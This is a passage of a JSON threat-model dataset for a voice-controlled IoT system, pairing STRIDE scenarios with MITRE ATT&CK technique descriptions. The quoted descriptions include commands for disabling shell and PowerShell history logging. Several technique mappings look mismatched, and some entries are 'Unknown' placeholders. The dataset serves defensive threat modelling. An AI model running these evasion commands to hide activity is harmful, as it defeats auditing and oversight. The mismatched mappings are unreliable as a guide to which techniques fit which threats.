Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",
                "id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
                "technique_id": "T1218.011"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains physical access to IoT devices, altering their firmware to execute different actions.",
            "Assumptions": [
                {
                    "Assumption": "Physical access to the IoT devices is possible for an unauthorized user.",
                    "Role": "Physical Security Team",
                    "Condition": "Inadequate physical security measures."
                },
                {
                    "Assumption": "The devices do not enforce firmware integrity validation.",
                    "Role": "Device Manufacturer",
                    "Condition": "No digital signatures or hash validation in place."
                },
                {
                    "Assumption": "The attacker has specialized knowledge of the device firmware and capabilities.",
                    "Role": "Attacker",
                    "Condition": "Technical expertise in firmware manipulation."
                }
            ],
            "Potential Impact": "Corruption and modification of device behavior and actions.",
            "MITRE ATT&CK Keywords": [
                "firmware tampering",
                "physical security breach",
                "device manipulation",
                "hardware compromise"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny having issued certain voice commands that resulted in significant actions by IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "The system does not log voice commands with sufficient detail.",
                    "Role": "System Architect",
                    "Condition": "Lack of comprehensive logging capabilities."
                },
                {
                    "Assumption": "No verification method for confirming the source of voice commands exists.",
                    "Role": "Application Developer",
                    "Condition": "Absence of identifiable voice signature technology."
                },
                {
                    "Assumption": "The system does not support audit trails for user actions.",
                    "Role": "Database Admin",
                    "Condition": "No auditing setup in place."
                }
            ],
            "Potential Impact": "Dispute over actions taken by the IoT systems.",
            "MITRE ATT&CK Keywords": [
                "voice command repudiation",
                "audit trail insufficiency",
                "command logging",
                "user actions dispute"
            ],
            "mitre_technique": {
                "name": "Impair Command History Logging",
                "description": "Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.\n\nAdversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that \u201c ls\u201d will not be saved, but \u201cls\u201d would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. \n\nOn Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)\n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. <code>no logging</code>).",
                "id": "attack-pattern--8f504411-cb96-4dac-a537-8d2bb7679c59",
                "technique_id": "T1562.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Logs of user interactions and commands are tampered with after execution.",
            "Assumptions": [
                {
                    "Assumption": "Logs are stored in an insecure manner.",
                    "Role": "Database Admin",
                    "Condition": "Logs lack encryption or integrity checks."
                },
                {
                    "Assumption": "Privilege escalation allows attackers to access and modify logs.",
                    "Role": "System Admin",
                    "Condition": "Insufficient access controls and monitoring."
                },
                {
                    "Assumption": "Log entries do not have write-once, read-many (WORM) protection.",
                    "Role": "System Designer",
                    "Condition": "Logs are modifiable without detection."
                }
            ],
            "Potential Impact": "Inability to trust the log data for forensic analysis or auditing.",
            "MITRE ATT&CK Keywords": [
                "log tampering",
                "data integrity",
                "audit log manipulation",
                "forensic evasion"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker impersonates an administrator and deletes or alters system logs.",
            "Assumptions": [
                {
                    "Assumption": "Admin credentials are compromised or easy to crack.",
                    "Role": "System Admin",
                    "Condition": "Weak password policies or credential theft."
                },
                {
                    "Assumption": "Administrative actions are not independently audited or monitored.",
                    "Role": "Security Admin",
                    "Condition": "Lack of secondary audit mechanisms."
                },
                {
                    "Assumption": "System log integrity is not protected by digital signatures or hashing.",
                    "Role": "Database Admin",
                    "Condition": "Logs are kept in modifiable formats."
                }
            ],
            "Potential Impact": "Loss of accountability and traceability of system activity.",
            "MITRE ATT&CK Keywords": [
                "admin impersonation",
                "system log deletion",
                "audit log destruction",
                "credential theft"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Eavesdropping on unencrypted communication between the client-side application and server.",
            "Assumptions": [
                {
                    "Assumption": "Network traffic is in plaintext.",
                    "Role": "System Architect",
                    "Condition": "Lack of encryption for communication."
                },
                {
                    "Assumption": "No additional security like VPN is in place.",
                    "Role": "Network Engineer",
                    "Condition": "Absence of secure communication tunnels."
                },
                {
                    "Assumption": "Attacker can access the data transmission path.",
                    "Role": "Attacker",
                    "Condition": "Compromised or accessible network segments."
                }
            ],
            "Potential Impact": "Exposure of sensitive voice commands and response data.",
            "MITRE ATT&CK Keywords": [
                "eavesdropping",
                "traffic interception",
                "unencrypted communication",
                "data exposure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Cloud services storing user data are compromised, exposing sensitive user interactions.",
            "Assumptions": [
                {
                    "Assumption": "Stored data in the cloud is not encrypted.",
                    "Role": "Cloud Services Provider",
                    "Condition": "Poor data security practices."
                },
                {
                    "Assumption": "Cloud access controls are inadequate.",
                    "Role": "Cloud Security Admin",
                    "Condition": "Weak access control policies."
                },
                {
                    "Assumption": "There are exploitable vulnerabilities in the cloud service.",
                    "Role": "Attacker",
                    "Condition": "Presence of unpatched or zero-day vulnerabilities."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive user data.",
            "MITRE ATT&CK Keywords": [
                "cloud storage compromise",
                "data breach",
                "user data exposure",
                "information leak"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An internal employee accesses and extracts sensitive voice recordings from the server-side application.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient access controls and monitoring.",
                    "Role": "IT Security Admin",
                    "Condition": "Weak internal security policies."
                },
                {
                    "Assumption": "Employees have excessive permissions.",
                    "Role": "System Admin",
                    "Condition": "Over-provisioning of user permissions."
                },
                {
                    "Assumption": "No effective data loss prevention (DLP) mechanisms in place.",
                    "Role": "Security Architect",
                    "Condition": "Absence of DLP controls."
                }
            ],
            "Potential Impact": "Internal data breach and potential misuse of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "data extraction",
                "internal compromise",
                "sensitive data leak"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Botnet attack floods the server-side application with traffic, overwhelming the system.",
            "Assumptions": [
                {
                    "Assumption": "Server infrastructure can be overwhelmed by large volumes of traffic.",
                    "Role": "System Architect",
                    "Condition": "Lack of scalability or rate-limiting mechanisms."
                },
                {
                    "Assumption": "Attackers can coordinate a distributed botnet.",
                    "Role": "Attacker",
                    "Condition": "Access to compromised or botnet-infected devices."
                },
                {
                    "Assumption": "No adequate DDoS protection is in place.",
                    "Role": "Network Security Admin",
                    "Condition": "Absence of DDoS mitigation solutions."
                }
            ],
            "Potential Impact": "System downtime and disruption of service.",
            "MITRE ATT&CK Keywords": [
                "DDoS attack",
                "traffic flooding",
                "botnet",
                "server overload"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious firmware update on IoT devices causing them to stop functioning.",
            "Assumptions": [
                {
                    "Assumption": "IoT devices can receive and apply updates automatically.",
                    "Role": "Device Manufacturer",
                    "Condition": "Automatic or over-the-air updates enabled."
                },
                {
                    "Assumption": "Firmware integrity checks are weak or nonexistent.",
                    "Role": "Device Engineer",
                    "Condition": "Lack of update validation."
                },
                {
                    "Assumption": "Attackers can push malicious firmware updates.",
                    "Role": "Attacker",
                    "Condition": "Exploitation of firmware update mechanisms."
                }
            ],
            "Potential Impact": "Complete or partial failure of IoT devices.",
            "MITRE ATT&CK Keywords": [
                "firmware attack",
                "device bricking",
                "malicious update",
                "IoT failure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Excessive voice command inputs overwhelm the client-side application and server.",
            "Assumptions": [
                {
                    "Assumption": "Client-side application does not limit the frequency of voice commands.",
                    "Role": "Application Developer",
                    "Condition": "No rate-limiting implemented."
                },
                {
                    "Assumption": "Server cannot handle a high volume of requests simultaneously.",
                    "Role": "System Architect",
                    "Condition": "Limited server capacity."
                },
                {
                    "Assumption": "The attacker can generate continuous voice inputs.",
                    "Role": "Attacker",
                    "Condition": "Access to automated voice input tools."
                }
            ],
            "Potential Impact": "System slows down or becomes unavailable.",
            "MITRE ATT&CK Keywords": [
                "voice spam",
                "service disruption",
                "excessive input",
                "client overload"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the server-side application to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "There exist exploitable vulnerabilities in the server-side application.",
                    "Role": "Application Developer",
                    "Condition": "Lack of robust security testing and patching."
                },
                {
                    "Assumption": "The server application runs with administrative privileges.",
                    "Role": "System Admin",
                    "Condition": "Misconfigured or over-privileged server application."
                },
                {
                    "Assumption": "No comprehensive role-based access controls (RBAC) are implemented.",
                    "Role": "Security Architect",
                    "Condition": "Absence of granular access controls."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive areas of the system.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "server-side vulnerability",
                "access control bypass",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A compromised IoT controller firmware allows remote attackers to execute commands with elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "IoT controller firmware has security flaws.",
                    "Role": "Device Manufacturer",
                    "Condition": "Existing firmware vulnerabilities."
                },
                {
                    "Assumption": "Attackers can exploit the firmware remotely.",
                    "Role": "Attacker",
                    "Condition": "Network access to the IoT controller."
                },
                {
                    "Assumption": "The controller can issue commands with administrative privileges to IoT devices.",
                    "Role": "Device Engineer",
                    "Condition": "Over-privileged command execution."
                }
            ],
            "Potential Impact": "Full control over connected IoT devices.",
            "MITRE ATT&CK Keywords": [
                "remote exploitation",
                "IoT firmware",
                "elevated privileges",
                "command execution"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages social engineering to obtain administrative credentials from system operators.",
            "Assumptions": [
                {
                    "Assumption": "System operators can be targeted with social engineering techniques.",
                    "Role": "Security Awareness Trainer",
                    "Condition": "Lack of user training and awareness."
                },
                {
                    "Assumption": "There are no multi-factor authentication (MFA) solutions in place.",
                    "Role": "Security Architect",
                    "Condition": "Single factor authentication methods used."
                },
                {
                    "Assumption": "Attacker has knowledge of the system's administrative structure.",
                    "Role": "Attacker",
                    "Condition": "Information gathering about the system."
                }
            ],
            "Potential Impact": "Full system access and control.",
            "MITRE ATT&CK Keywords": [
                "social engineering",
                "credential theft",
                "administrative access",
                "MFA bypass"
            ],
            "mitre_technique": {
                "name": "Compromise Accounts",
                "description": "Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. [Establish Accounts](https://attack.mitre.org/techniques/T1585)), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials.(Citation: AnonHBGary)(Citation: Microsoft DEV-0537) Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries may directly leverage compromised email accounts for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).",
                "id": "attack-pattern--81033c3b-16a4-46e4-8fed-9b030dd03c4a",
                "technique_id": "T1586"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "12",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could impersonate a user\u2019s voice commands utilizing a previously recorded audio sample of the user.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical or remote access to a recording device that captured the user's voice.",
                    "Role": "Attacker",
                    "Condition": "Audio capture"
                },
                {
                    "Assumption": "The voice recognition system does not have sufficient anti-spoofing mechanisms such as voice biometrics.",
                    "Role": "System Designer",
                    "Condition": "Weak authentication"
                },
                {
                    "Assumption": "The attacker can send the audio sample through an entry point that the system accepts voice commands from.",
                    "Role": "Attacker",
                    "Condition": "Trusted entry point"
                }
            ],
            "Potential Impact": "Unauthorized access to IoT controls or data leakage.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential manipulation",
                "audio injection"
            ],
            "mitre_technique": {
                "name": "User Execution",
                "description": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).\n\nWhile [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\n\nAdversaries may also deceive users into performing actions such as enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary; running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s; or downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204).(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nFor example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)",
                "id": "attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5",
                "technique_id": "T1204"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An unauthorized entity could masquerade as a legitimate IoT device communicating with the IoT controller through forged packets.",
            "Assumptions": [
                {
                    "Assumption": "The network communication protocol does not enforce strong authentication for devices.",
                    "Role": "System Designer",
                    "Condition": "Weak protocol"
                },
                {
                    "Assumption": "The attacker has capability to forge network packets or can hijack the communication channel.",
                    "Role": "Attacker",
                    "Condition": "Network access"
                },
                {
                    "Assumption": "The system does not utilize encryption for data in transit.",
                    "Role": "System Administrator",
                    "Condition": "Unencrypted communication"
                }
            ],
            "Potential Impact": "Control over IoT devices leading to unauthorized actions.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network injection",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "DHCP Spoofing",
                "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool. ",
                "id": "attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5",
                "technique_id": "T1557.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Malicious actor could spoof cloud service communications to intercept and alter data being transmitted between the client-side and server-side applications.",
            "Assumptions": [
                {
                    "Assumption": "The system does not use secure, verified channels for cloud communication.",
                    "Role": "System Designer",
                    "Condition": "Insecure communication"
                },
                {
                    "Assumption": "The attacker can conduct Man-in-the-Middle (MitM) attacks on cloud communication.",
                    "Role": "Attacker",
                    "Condition": "Compromised network"
                },
                {
                    "Assumption": "The cloud service lacks mutual authentication.",
                    "Role": "Service Provider",
                    "Condition": "Single-sided authentication"
                }
            ],
            "Potential Impact": "Data tampering and interception of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "MitM attack",
                "cloud service manipulation"
            ],
            "mitre_technique": {
                "name": "ARP Cache Poisoning",
                "description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)\n",
                "id": "attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213",
                "technique_id": "T1557.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker corrupts firmware updates for the IoT devices to embed malicious code.",
            "Assumptions": [
                {
                    "Assumption": "The firmware update process lacks integrity checks.",
                    "Role": "System Designer",
                    "Condition": "No integrity verification"
                },
                {
                    "Assumption": "The attacker has access to the firmware distribution channel.",
                    "Role": "Attacker",
                    "Condition": "Access to distribution"
                },
                {
                    "Assumption": "Updates are not signed by a trusted certificate.",
                    "Role": "System Designer",
                    "Condition": "Unsigned updates"
                }
            ],
            "Potential Impact": "Compromise of IoT devices leading to unauthorized actions or system control.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware corruption",
                "supply chain attack"
            ],
            "mitre_technique": {
                "name": "Firmware Corruption",
